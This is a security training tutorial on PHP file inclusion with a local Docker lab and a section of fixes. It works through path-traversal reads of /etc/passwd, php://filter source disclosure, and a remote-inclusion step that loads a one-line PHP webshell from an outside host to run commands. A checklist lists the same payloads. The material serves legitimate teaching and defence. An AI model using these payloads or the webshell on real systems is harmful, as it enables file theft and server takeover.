# LFI / RFI — File Inclusion

> **Difficulty:** Medium — **Level:** intermediate

## Introduction

Apps often load file content from a parameter: `index.php?page=home.php`, `?lang=en`, `?view=about`. **File Inclusion** happens when that parameter is used directly in an `include()`/`require()` call without validation. **LFI (Local File Inclusion)** reads files on the server (`/etc/passwd`, source code...). **RFI (Remote File Inclusion)** loads a remote file (webshell). Grouped under **A05 Security Misconfiguration / A03 Injection** depending on taxonomy. Great for **chaining**: LFI reads source → find sensitive functions → RCE.

---

## Part A — Understand

### The mechanism

The app does:

```php
// VULNERABLE
$page = $_GET['page'];
include($page);
```

- Send `?page=../../../../etc/passwd` → includes `/etc/passwd`.
- Use `php://filter` to read **source code** as base64: `?page=php://filter/convert.base64-encode/resource=home.php`.
- If `allow_url_include=On`, send `?page=http://evil.com/shell.txt` → the server fetches a webshell and executes it → **RFI → RCE**.

### LFI vs RFI

| | LFI | RFI |
|---|---|---|
| Loads | Internal server file | Remote URL |
| Impact | Read sensitive files | Execute remote code (RCE) |
| Requirement | Just unvalidated `include()` | Needs `allow_url_include=On` |
| Example | `/etc/passwd`, `php://filter` | `http://attacker/shell.txt` |

> **Intuition:** The app says "open the box I name". LFI: you make it open a box outside its reach (`../../` paths). RFI: you hand it a box from your home — inside is malware.

---

## Part B — Exploit: LFI/RFI Lab

### Step 1: Start the lab

```bash
cd lfi-rfi/lab
docker compose up -d
# Lab at: http://localhost:7108
```

The lab is a news reader with a `page` parameter (loads files from `pages/`). Two flags: `/flag.txt` (read via LFI) and the webshell flag (via RFI).

<!-- IMG: LFI lab page with page parameter, opening a normal page (step 1). File: lfi-rfi_01_lfi_page.png -->

### Step 2: Browse normally

```bash
$ curl -s "http://localhost:7108/index.php?page=home"
( home page content )
```

<!-- IMG: Opening the home page normally (step 2). File: lfi-rfi_02_normal_view.png -->

### Step 3: LFI read /etc/passwd

```bash
$ curl -s "http://localhost:7108/index.php?page=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
```

<!-- IMG: LFI reading /etc/passwd successfully (step 3). File: lfi-rfi_03_etc_passwd.png -->

> **Explain:** `../../../../etc/passwd` climbs 4 directories to reach `/etc/passwd`. Since `include()` doesn't validate paths, you can point it at any file the server can read. (On very old PHP there's also the **null byte** `%00` trick to cut off an appended `.php`.)

### Step 4: LFI read source code with php://filter

```bash
$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php"
PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
```

<!-- IMG: php://filter returning base64 source of index (step 4). File: lfi-rfi_04_php_filter.png -->

```bash
# Decode the base64 to get the source
$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
```

> **Explain:** `php://filter` makes PHP read the **source code** and encode it as base64 (reading directly would execute the file first, so base64 lets you see the original code). From the source you find parameters, `include` calls, the directory layout... then read other files (`config.php`, `admin.php`).

### Step 5: Read the flag via LFI

```bash
$ curl -s "http://localhost:7108/index.php?page=../../../../flag.txt"
FLAG{l0c4l_f1l3_1ncl_2026}
```

<!-- IMG: Reading /flag.txt via LFI successfully (step 5). File: lfi-rfi_05_read_flag.png -->

### Step 6: RFI — load a remote webshell → RCE

```bash
# 1. On your machine, create shell.txt with PHP code:
#    <?php system($_GET['cmd']); ?>
#    and serve it:  python3 -m http.server 8888

# 2. Load the remote file into the lab
$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt"

# 3. Run a remote command
$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<!-- IMG: RFI loading the webshell and running the id command (step 6). File: lfi-rfi_06_rfi_shell.png -->

> **Explain:** PHP hits `include("http://attacker/shell.txt")` → downloads the remote content. It's PHP code → executed on the server. The `cmd` parameter controls the command. This is **RCE** — you control the server. (This RFI part requires the lab running with `allow_url_include=On`.)

---

## Part C — Defend

### Fixes

1. **Whitelist** — only allow a known set of files:

```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed, true)) { die('invalid'); }
include("pages/$page.php");
```

2. **Never use input as a path.** If needed, map through an array (`key => real file`).
3. **Disable `allow_url_include`** (default Off) — blocks RFI.
4. Keep flags outside the web root, set proper chmod, avoid dynamic `include` when possible.

### Quick test checklist

```text
[ ] ?page=../../../../etc/passwd
[ ] ?page=/etc/passwd  (absolute path)
[ ] ?page=..%2f..%2f..%2fetc%2fpasswd  (encoded)
[ ] ?page=php://filter/convert.base64-encode/resource=home.php
[ ] ?page=http://YOUR_IP/shell.txt  (RFI — try if allow_url_include is on)
[ ] ?page=data://text/plain;base64,PD9waHAg...  (data:// wrapper)
[ ] Any .php that includes a parameter? (read source with the filter)
```

---
